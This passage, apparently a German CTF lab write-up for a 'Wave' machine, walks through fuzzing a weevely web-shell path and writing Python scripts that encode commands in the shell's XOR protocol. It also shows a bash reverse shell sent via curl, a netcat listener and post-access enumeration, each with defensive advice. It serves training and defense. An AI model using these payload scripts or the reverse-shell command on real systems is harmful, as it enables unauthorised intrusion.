+<span class="command">          \/_/    \/_/   \/___/    \/_/       </span>
+
+<span class="command">       v2.1.0-dev</span>
+<span class="command">________________________________________________</span>
+
+<span class="command"> :: Method           : GET</span>
+<span class="command"> :: URL              : http://wave.hmv/weevely.FUZZ</span>
+<span class="command"> :: Wordlist         : FUZZ: /tmp/php_ext.txt</span>
+<span class="command"> :: Follow redirects : false</span>
+<span class="command"> :: Calibration      : false</span>
+<span class="command"> :: Timeout          : 10</span>
+<span class="command"> :: Threads          : 40</span>
+<span class="command"> :: Matcher          : Response status: 200</span>
+<span class="command">________________________________________________</span>
+
+<span class="password">php7                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]</span>
+<span class="command">:: Progress: [7/7] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutzte das schnelle Fuzzing-Werkzeug `ffuf` (Fuzz Faster U Fool) mit der zuvor erstellten Liste der PHP-Endungen. Der Befehl `ffuf -w php_ext.txt -u http://wave.hmv/weevely.FUZZ -mc 200` wies `ffuf` an, jede Zeile aus der Wordlist (`php_ext.txt`) anstelle des `FUZZ`-Schlüsselworts in der URL (`http://wave.hmv/weevely.FUZZ`) zu testen. Ich filterte die Ergebnisse, um nur Antworten mit dem Statuscode 200 (OK) anzuzeigen (`-mc 200`). Das Ziel war, herauszufinden, welche der Endungen dazu führt, dass der Server mit einem 200 OK Status auf die `weevely`-Datei antwortet, was darauf hindeutet, dass die Datei unter diesem Namen existiert und wahrscheinlich als PHP behandelt wird. Die Ausgabe zeigte einen Treffer: `php7`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Ergebnis von `ffuf` war sehr aufschlussreich. Es bestätigte, dass die Datei `weevely.bck`, wenn sie als `weevely.php7` angefragt wird, mit Status 200 antwortet. Dies deutet stark darauf hin, dass `.php7` eine vom Webserver als ausführbar konfigurierte Endung ist und die Weevely-Shell unter dieser URL ansprechbar sein wird. Dies ist der korrekte Pfad, um die Shell im nächsten Schritt zu nutzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie Fuzzing-Tools wie `ffuf` oder `wfuzz` mit gezielten Wordlists und Filtern, um versteckte Dateien, Endungen oder Parameter zu finden. Testen Sie alle relevanten Endungen, insbesondere wenn Sie die Art einer Datei kennen (z.B. PHP-Code) aber die Endung irreführend ist.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Konfiguration Ihres Webservers, welche Dateiendungen als ausführbar behandelt werden. Beschränken Sie dies auf das absolute Minimum. Verwenden Sie keine ungewöhnlichen oder historischen PHP-Endungen (wie `.php7`, `.phtml`, etc.), wenn nicht explizit erforderlich.
+            </p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">echo '' > exploit.py</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf der Analyse des Weevely-Codes aus der Datei `x`, habe ich begonnen, eigene Python-Skripte zu schreiben, um Payloads für die Shell zu generieren. Der erste Schritt war das Erstellen einer leeren Datei namens `exploit.py` im `/tmp`-Verzeichnis auf meinem Kali-System.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies war der Beginn des Entwicklungsprozesses für meinen maßgeschneiderten Weevely-Client. Da ich den Schlüssel und das Protokoll der Shell kannte, konnte ich ein einfaches Skript schreiben, das die gleichen Kodierungs- und Verschlüsselungsschritte durchführt wie die Shell selbst, um Befehle zu senden und Antworten zu erhalten. Dies ist oft effektiver als der offizielle Weevely-Client, wenn man nur den Shell-Code hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie das Protokoll einer gefundenen Web-Shell entschlüsseln können, schreiben Sie eigene Tools, um mit ihr zu interagieren. Dies gibt Ihnen mehr Kontrolle und Flexibilität bei der Ausnutzung.
+                <br><strong>Empfehlung (Admin):</strong> Gehen Sie davon aus, dass Angreifer, die eine Web-Shell finden, diese analysieren und eigene Clients entwickeln werden. Konzentrieren Sie sich auf die Verhinderung des Platzierens von Web-Shells und die Erkennung ungewöhnlichen Traffics zu ihnen, anstatt darauf, dass der Angreifer den offiziellen Client benötigt.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">vi exploit.py</span>
+                    </div>
+                    <pre>
+<span class="command"># payload_generator.py
+import zlib, base64
+
+# ---- KONFIGURATION ----
+CMD = 'system("ss -tunlp");'
+KEY = "3ddf0d5c"
+PREFIX = "b6e7a529b6c2"
+SUFFIX = "d598a771749b"
+# -----------------------
+
+def xor(data, key):
+    return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
+
+compressed = zlib.compress(CMD.encode())
+xored = xor(compressed, KEY)
+encoded = base64.b64encode(xored).decode()
+
+print(f"{PREFIX}{encoded}{SUFFIX}")</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich habe das Python-Skript `exploit.py` im Editor `vi` geschrieben. Das Skript importiert die Bibliotheken `zlib` (für Kompression/Dekomprimierung) und `base64` (für Base64-Kodierung/Dekodierung). Es definiert den statischen Schlüssel (`KEY`), das Präfix (`PREFIX`) und das Suffix (`SUFFIX`), die ich aus dem Code der Web-Shell extrahiert hatte. Die `xor`-Funktion implementiert die im Shell-Code gefundene XOR-Logik. Das Skript nimmt einen beliebigen Befehl in der Variable `CMD`, komprimiert ihn mit `zlib`, verschlüsselt ihn mit der `xor`-Funktion unter Verwendung des Schlüssels, kodiert das Ergebnis mit Base64 und gibt die endgültige Payload-Zeichenkette aus, die von den definierten Präfixen und Suffixen umschlossen ist. Als Testbefehl wurde `system("ss -tunlp");` eingetragen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieses Skript ist ein direkter Nachbau der serverseitigen Kodierungslogik. Es ermöglicht mir, beliebige PHP-Befehle (`CMD`) in das Format zu bringen, das die Weevely-Shell erwartet. Dies ist der Kern meines künstlichen Clients. Der Testbefehl `system("ss -tunlp");` ist nützlich, um die Shell nach erfolgreicher Ausführung zu testen und laufende Netzwerkdienste zu sehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erstellen Sie kleine, spezifische Skripte, um wiederkehrende oder komplexe Kodierungsaufgaben während eines Pentests zu automatisieren. Passen Sie Skripte an die spezifischen Anforderungen von gefundenen Schwachstellen oder Backdoors an.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Intrusion Detection/Prevention Systeme (IDS/IPS) und Web Application Firewalls (WAF), die ungewöhnliche oder bösartige Payloads im HTTP-Request Body erkennen können, auch wenn diese kodiert oder verschlüsselt sind. Überwachen Sie das Ausführen von Systembefehlen (`system()`, `exec()`, `shell_exec()` etc.) durch den Webserver-Prozess.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">vi sende.py</span>
+                    </div>
+                    <pre>
+<span class="command"># payload_generator.py
+import zlib, base64, argparse
+
+# ---- KONFIGURATION ----
+KEY = "3ddf0d5c"
+PREFIX = "b6e7a529b6c2"
+SUFFIX = "d598a771749b"
+# -----------------------
+
+def xor(data, key):
+    return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
+
+parser = argparse.ArgumentParser(description="Weevely Payload Generator")
+parser.add_argument("command", type=str, help="Der PHP-Befehl, der ausgeführt werden soll (z.B. 'system(\"whoami\");')")
+args = parser.parse_args()
+
+CMD = args.command
+
+compressed = zlib.compress(CMD.encode())
+xored = xor(compressed, KEY)
+encoded = base64.b64encode(xored).decode()
+
+print(f"{PREFIX}{encoded}{SUFFIX}")</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich erstellte ein zweites Python-Skript namens `sende.py`. Dieses Skript basiert auf `exploit.py`, wurde aber modifiziert, um den auszuführenden Befehl als Kommandozeilenargument entgegenzunehmen. Es verwendet die `argparse`-Bibliothek, um das Argument `command` zu parsen. Der übergebene Befehl wird dann wie in `exploit.py` komprimiert, XOR-verschlüsselt, Base64-kodiert und mit Präfixen und Suffixen umgeben ausgegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das `sende.py` Skript ist praktischer für die interaktive Nutzung. Ich kann es nun einfach ausführen und den gewünschten Befehl als Argument übergeben, anstatt das Skript jedes Mal bearbeiten zu müssen. Dies vereinfacht das Generieren verschiedener Payloads für Tests und die eigentliche Ausnutzung erheblich. Es war ein wichtiger Schritt, um meinen Workflow für die Shell-Interaktion zu optimieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Entwickeln Sie Skripte schrittweise. Beginnen Sie mit einem einfachen Proof-of-Concept-Skript und erweitern Sie es dann um Funktionen wie Argument-Parsing oder Loop-Funktionalität, um den Prozess effizienter zu gestalten.
+                <br><strong>Empfehlung (Admin):</strong> Erkennen Sie Skripte oder Tools, die zur Payload-Generierung verwendet werden könnten. Überwachen Sie die Ausführung von Python-Skripten mit ungewöhnlichen Argumenten oder deren Interaktion mit externen Ressourcen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">python3 exploit.py</span>
+                    </div>
+                    <pre>
+<span class="password">b6e7a529b6c2S/hPyBxKfK7mNE5IZrQYSv6vTTbi0DNjfrZiug==d598a771749b</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich habe das erste Skript `exploit.py` mit Python 3 ausgeführt. Wie erwartet, generierte das Skript eine Base64-kodierte Zeichenkette, umgeben von den spezifischen Präfixen und Suffixen (`b6e7a529b6c2` und `d598a771749b`), die dem im Skript definierten Testbefehl (`system("ss -tunlp");`) entsprechen. Die Ausgabe `b6e7a529b6c2S/hPyBxKfK7mNE5IZrQYSv6vTTbi0DNjfrZiug==d598a771749b` ist die fertig formatierte Payload.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Testlauf bestätigte, dass mein `exploit.py` Skript korrekt funktioniert und Payloads im richtigen Format erzeugt. Dies war ein wichtiger Validierungsschritt, bevor ich versuchte, Payloads an die eigentliche Web-Shell zu senden. Die generierte Zeichenkette repräsentiert den Befehl `system("ss -tunlp");` in einer Form, die die Weevely-Shell entschlüsseln und ausführen sollte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie Skripte zur Payload-Generierung immer zuerst lokal, um sicherzustellen, dass sie das erwartete Format ausgeben, bevor Sie sie gegen das Zielsystem einsetzen.
+                <br><strong>Empfehlung (Admin):</strong> Analysieren Sie ungewöhnliche Datenformate oder Strukturen im HTTP-Request Body, insbesondere bei POST-Anfragen an potenzielle Web-Shell-Pfade. Muster wie Präfixe/Suffixe oder Base64-kodierter Inhalt können auf bösartigen Traffic hindeuten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">python3 sende.py whoami</span>
+                    </div>
+                    <pre>
+<span class="password">b6e7a529b6c2S/hPqfgr+a43ZGycMuI=d598a771749b</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">python3 sende.py id</span>
+                    </div>
+                    <pre>
+<span class="password">b6e7a529b6c2S/ivKjFkNFszqg==d598a771749b</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich testete das `sende.py` Skript, indem ich es mit den Befehlen `whoami` und `id` als Argumente aufrief. Beide Aufrufe erzeugten unterschiedliche, aber korrekt formatierte Payloads, die jeweils mit dem Präfix `b6e7a529b6c2` begannen und mit dem Suffix `d598a771749b` endeten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die erfolgreiche Generierung von Payloads für verschiedene Befehle zeigte, dass das `sende.py` Skript wie beabsichtigt funktioniert. Ich konnte nun leicht Payloads für beliebige Systembefehle generieren, die ich auf der Ziel-VM ausführen wollte. Dies war der letzte Schritt, bevor ich die Web-Shell tatsächlich aktivierte, um initialen Zugriff zu erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erstellen Sie Skripte, die Kommandozeilenargumente verarbeiten können, um Ihre Interaktion mit gefundenen Schwachstellen oder Backdoors flexibler zu gestalten. Testen Sie die Payload-Generierung mit verschiedenen einfachen Befehlen (`whoami`, `id`, `ls`), um die korrekte Funktion zu überprüfen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Webserver-Logs auf eine hohe Anzahl von Anfragen mit ungewöhnlichen POST-Bodies oder sich wiederholenden Mustern (wie die Präfixe/Suffixe des Shell-Protokolls). Implementieren Sie eine Log-Analyse, die nach solchen Mustern sucht.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">REVERSE_SHELL_CMD="sy5tem(\"bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'\");"</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">PAYLOAD=$(python3 /tmp/sende.py "$REVERSE_SHELL_CMD")</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Mein Ziel war nun, eine Reverse Shell zu erhalten, um eine interaktivere Kommandozeile auf dem Zielsystem zu haben, anstatt nur einzelne Befehle über die Web-Shell ausführen zu können. Ich definierte eine Variable `REVERSE_SHELL_CMD` mit dem PHP-Code `system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'");`. Dieser Code ruft den `system`-Befehl in PHP auf, um eine Bash-Reverse-Shell zu starten, die sich mit meiner IP-Adresse (`192.168.2.199`) auf Port `4444` verbinden soll. Das `-c` Argument in `bash` führt den String als Befehl aus, und der Rest ist eine Standardkonstruktion für eine TCP-Reverse-Shell. Ich speicherte dann die von meinem `sende.py` Skript generierte Payload für diesen PHP-Befehl in der Variable `PAYLOAD`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Vorbereitung des Reverse-Shell-Befehls als Variable ist eine saubere Methode. Die Payload-Generierung mittels meines `sende.py` Skripts stellte sicher, dass der Befehl korrekt für die Weevely-Shell kodiert ist. Dies war der kritische Schritt, um die Web-Shell nicht nur für einzelne Befehle, sondern für das Erlangen einer persistenten, interaktiven Verbindung zu nutzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem Sie die Kontrolle über eine Web-Shell erlangt haben, versuchen Sie immer, eine stabilere Reverse oder Bind Shell zu etablieren. Nutzen Sie dafür bewährte Befehle und Tools (Netcat, Python, Bash, PHP etc.). Testen Sie die Payload-Generierung für Ihren Shell-Befehl, bevor Sie ihn senden.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Ihrem Webserver, insbesondere zu ungewöhnlichen Ports oder Zielen im Internet oder internen Netzwerken. Implementieren Sie Netzwerksegmentierung, um zu verhindern, dass ein kompromittierter Webserver Verbindungen zu anderen Systemen aufbauen kann.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">curl -s -X POST "http://wave.hmv/weevely.php7" -d "$PAYLOAD"</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutzte das Kommandozeilen-Tool `curl`, um die generierte Payload (`$PAYLOAD`) an die Web-Shell zu senden. Der Befehl `curl -s -X POST "http://wave.hmv/weevely.php7" -d "$PAYLOAD"` sendet eine HTTP POST-Anfrage (`-X POST`) an die zuvor mittels `ffuf` identifizierte URL `http://wave.hmv/weevely.php7`. Der Parameter `-d "$PAYLOAD"` fügt die Base64-kodierte und mit Präfixen/Suffixen umgebene Payload in den Body der POST-Anfrage ein. Die Option `-s` unterdrückt die Fortschrittsanzeige von `curl`. Dies war der Moment, in dem ich die Web-Shell aktivierte und versuchte, die Reverse Shell zu initiieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl war der entscheidende Schritt zur Erlangung initialen Zugriffs. Durch das Senden der korrekt formatierten Payload an den richtigen Endpunkt erwarte ich, dass die Web-Shell den enthaltenen PHP-Code ausführt, der wiederum die Reverse Shell zu meinem lauschenden Netcat-Prozess auf Port 4444 starten soll. Die Tatsache, dass die Web-Shell auf POST-Daten wartet und diese verarbeitet, macht sie zu einem effektiven Kommunikationspunkt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie `curl` oder ähnliche Tools, um HTTP-Anfragen mit spezifischen Daten (POST-Body, Headern etc.) zu senden. Dies ist essentiell für die Interaktion mit Web-Schwachstellen oder Web-Shells. Stellen Sie sicher, dass Sie die HTTP-Methode (POST) und das Datenformat (im Body) korrekt verwenden.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie HTTP POST-Anfragen auf ungewöhnlich große oder strukturierte Daten im Body. Implementieren Sie Input-Validierung und Sanitization auf Serverseite, um sicherzustellen, dass empfangene Daten nicht unerwartet als Code ausgeführt werden können.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[/tmp]<br>
+└─# <span class="command">nc -lvnp 4444</span>
+                    </div>
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.33] 36180</span>
+<span class="command">bash: cannot set terminal process group (463): Inappropriate ioctl for device</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="prompt">www-data@wave:~/html$</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Bevor ich die `curl`-Anfrage absendete, startete ich einen Netcat-Listener auf meinem Kali-System. Der Befehl `nc -lvnp 4444` instruiert Netcat, im Listening-Modus (`-l`), verbose (`-v`), numerisch (`-n`, verhindert DNS-Lookups) auf Port `4444` (`-p 4444`) zu lauschen. Kurz nachdem ich die `curl`-Anfrage gesendet hatte, zeigte die Netcat-Ausgabe an, dass eine Verbindung von der IP-Adresse des Ziels (`192.168.2.33`) auf Port 4444 hergestellt wurde (`connect to [192.168.2.199] from (UNKNOWN) [192.168.2.33] 36180`). Nach einigen Fehlermeldungen bezüglich des Terminals erhielt ich eine Shell-Eingabeaufforderung (`www-data@wave:~/html$`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch, die Reverse Shell war erfolgreich! Ich habe initialen Zugriff auf das Zielsystem erlangt. Die Shell läuft unter dem Benutzer `www-data`, was der Standard-Webserver-Benutzer unter Debian ist. Dies ist ein low-privileged Benutzerkonto, wie erwartet. Die Fehlermeldungen sind typisch für eine nicht-interaktive Shell, die über eine Netzwerkverbindung gestartet wird. Die `www-data` Eingabeaufforderung bestätigt meine aktuelle Identität und meinen aktuellen Speicherort auf dem Zielsystem (`~/html`).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bereiten Sie immer einen Netcat-Listener (oder ein alternatives Tool wie `rlwrap` für eine stabilere Shell) auf Ihrem Angriffssystem vor, bevor Sie versuchen, eine Reverse Shell zu initiieren. Überprüfen Sie die eingehende Verbindung und die erste Eingabeaufforderung, um Ihren aktuellen Benutzer und Speicherort zu bestätigen. Gehen Sie davon aus, dass Sie zunächst eine instabile Shell haben.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Verbindungen von Systemen, die keine solchen Verbindungen initiieren sollten, insbesondere von Webservern. Ungewöhnliche ausgehende Verbindungen zu unbekannten Hosts oder auf nicht standardmäßigen Ports können ein Indikator für eine kompromittierte Maschine und eine etablierte Reverse Shell sein. Netzwerk-Monitoring ist hier essenziell.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">stty rows 47 columns 94</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">ls /home/</span>
+                    </div>
+                    <pre>
+<span class="command">angie  carla</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">ls -la /home/angie</span>
+                    </div>
+                    <pre>
+ls: cannot open directory '/home/angie': <span class="password">Permission denied</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">ls -la /home/carla/</span>
+                    </div>
+                    <pre>
+ls: cannot open directory '/home/carla/': <span class="password">Permission denied</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">ls -la /etc/passwd</span>
+                    </div>
+                    <pre>
+<span class="command">-rw-r--r-- 1 root root 1180 Sep  4  2023 /etc/passwd</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Erhalt der `www-data` Shell führte ich einige grundlegende Befehle aus, um meine Umgebung zu erkunden. Zuerst verwendete ich `stty rows 47 columns 94`, um die Shell zu stabilisieren und die Zeilen- und Spaltenanzahl meines Terminals anzupassen. Dies verbessert die Darstellung und ermöglicht die Nutzung von Tools, die auf interaktive Shells ausgelegt sind (obwohl es nicht immer perfekt funktioniert). Anschließend listete ich die Inhalte des `/home`-Verzeichnisses auf (`ls /home/`), was die Existenz der Benutzerverzeichnisse für `angie` und `carla` zeigte. Der Versuch, diese Verzeichnisse mit detaillierter Auflistung (`ls -la`) zu inspizieren, schlug fehl und meldete "Permission denied", da der `www-data`-Benutzer nicht die notwendigen Berechtigungen dafür hat. Ich überprüfte dann die Berechtigungen für die `/etc/passwd` Datei (`ls -la /etc/passwd`), die lesbar war (`-rw-r--r--`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell-Stabilisierung ist ein Standardverfahren und wichtig für die Usability. Die Enumeration von `/home` zeigte die Namen der beiden regulären Benutzer auf dem System: `angie` und `carla`. Obwohl ich ihre Home-Verzeichnisse nicht direkt durchsuchen konnte, lieferten ihre Namen wichtige Hinweise für potenzielle Ziele bei der Privilegieneskalation. Die Lesbarkeit von `/etc/passwd` ist typisch und ermöglicht das Sammeln von Benutzerinformationen (Benutzernamen, UIDs, GIDs, Standard-Shells) sowie das Extrahieren von Hash-Passwörtern, falls diese in `/etc/shadow` stehen (was ich aufgrund der `/etc/passwd` Berechtigungen vermute, aber nicht direkt sehen konnte). Dies sind entscheidende Informationen für die nächste Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie Ihre Shell sofort nach dem Erhalt initialen Zugriffs. Führen Sie grundlegende Befehle aus, um Ihre Umgebung, Ihren Benutzer (`whoami`, `id`), Dateisystem (`ls`, `pwd`) und Netzwerk (`ip a`, `ss`) zu verstehen. Sammeln Sie Informationen über andere Benutzer auf dem System, z.B. durch Lesen von `/etc/passwd`.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für sensible Dateien wie `/etc/passwd` (weniger kritisch, da oft öffentlich lesbar) und insbesondere `/etc/shadow` (muss strikt geschützt sein) korrekt gesetzt sind. Überwachen Sie Zugriffe auf diese Dateien durch ungewöhnliche Benutzer wie `www-data`. Auditieren Sie regelmäßig die Dateisystemberechtigungen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">ss -altpn</span>
+                    </div>
+                    <pre>
+<span class="command">State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port      Process</span>
+<span class="command">LISTEN      0           1024                 127.0.0.1:3923                 0.0.0.0:*</span>
+<span class="command">LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*</span>
+<span class="command">LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*          users:(("nginx",pid=474,fd=5),("nginx",pid=473,fd=5),("nginx",pid=472,fd=5))</span>
+<span class="command">LISTEN      0           128                       [::]:22                      [::]:*</span>
+<span class="command">LISTEN      0           511                       [::]:80                      [::]:*          users:(("nginx",pid=474,fd=6),("nginx",pid=473,fd=6),("nginx",pid=472,fd=6))</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der `www-data` Shell habe ich den Befehl `ss -altpn` ausgeführt, um eine Liste der aktuellen Netzwerkverbindungen und lauschenden Sockets auf dem System zu erhalten. Die Optionen bedeuten: `s` (summary - hier nicht genutzt), `a` (all sockets), `l` (listening sockets), `t` (TCP sockets), `p` (show process using socket), `n` (numeric - verhindert Namensauflösung). Die Ausgabe zeigte, dass auf den Ports 22 (SSH) und 80 (HTTP) auf allen Schnittstellen (`0.0.0.0` und `[::]`) gelauscht wurde, wie bereits im Nmap-Scan festgestellt. Es gab auch einen lauschenden Socket auf `127.0.0.1:3923` (localhost:3923). Die Prozesse für Port 80 wurden korrekt als `nginx` identifiziert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl lieferte wichtige Informationen über interne Netzwerkdienste, die von außerhalb nicht direkt zugänglich sind. Der lauschende Dienst auf `127.0.0.1:3923` auf localhost ist besonders interessant. Da er nur lokal erreichbar ist, könnte er einen weiteren Angriffspunkt für die Privilegieneskalation bieten. Der Prozessname wurde nicht direkt angezeigt, aber Port 3923 ist nicht standardmäßig belegt und warrants further investigation.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie auf kompromittierten Systemen immer Befehle wie `ss`, `netstat`, `ip a` etc. aus, um die interne Netzwerkkonfiguration und laufende Dienste zu verstehen. Achten Sie besonders auf lokal lauschende Dienste, die von außen nicht sichtbar waren. Diese sind oft Ziele für die Privilegieneskalation durch Port Forwarding oder interne Verbindungen. Untersuchen Sie den Dienst auf Port 3923 genauer.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig, welche Dienste auf Ihren Systemen lauschen und auf welchen Schnittstellen (`0.0.0.0` vs. `127.0.0.1`). Deaktivieren Sie Dienste, die nicht benötigt werden, und stellen Sie sicher, dass Dienste, die nur für interne Zwecke gedacht sind, ausschließlich auf der Loopback-Schnittstelle (127.0.0.1) lauschen oder durch strenge Firewall-Regeln geschützt sind.
+            </p> 
+			            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:~/html$ <span class="command">cd /opt/</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach der ersten Orientierung im `www-data` Kontext wechselte ich das Verzeichnis in das `/opt/` Verzeichnis. Dies ist ein gängiger Ort auf Linux-Systemen, um optional installierte Softwarepakete oder auch benutzerdefinierte Skripte und Dateien abzulegen. Ich wollte sehen, ob hier möglicherweise interessante Dateien oder Tools für die Privilegieneskalation abgelegt waren, die vom Web-Root getrennt sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Verzeichnis `/opt/` ist oft ein guter Ort, um nach Hinweisen auf dem Zielsystem zu suchen, insbesondere in Capture-The-Flag (CTF) Umgebungen. Es ist abseits der Standard-Benutzerverzeichnisse und Systempfade und kann Entwickler- oder Administrator-spezifische Inhalte enthalten. Das Wechseln des Verzeichnisses war erfolgreich, was bedeutet, dass der `www-data` Benutzer Leseberechtigungen für diesen Pfad hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Erkunden Sie immer alle gängigen Verzeichnisse auf einem kompromittierten System (`/opt`, `/tmp`, `/var/tmp`, `/home`, `/root`, `/usr/local` etc.). Suchen Sie nach Dateien, Skripten, Konfigurationsdateien oder ungewöhnlichen Berechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Berechtigungen für Verzeichnisse wie `/opt` auf die unbedingt notwendigen Benutzer und Gruppen. Speichern Sie keine sensiblen Daten oder ausführbaren Skripte in allgemein lesbaren oder ausführbaren Verzeichnissen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/opt$ <span class="command">ls -la</span>
+                    </div>
+                    <pre>
+<span class="command">total 12</span>
+<span class="command">drwxr-xr-x  2 root root  4096 Sep  4  2023 .</span>
+<span class="command">drwxr-xr-x 18 root root  4096 Sep  4  2023 ..</span>
+<span class="command">-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
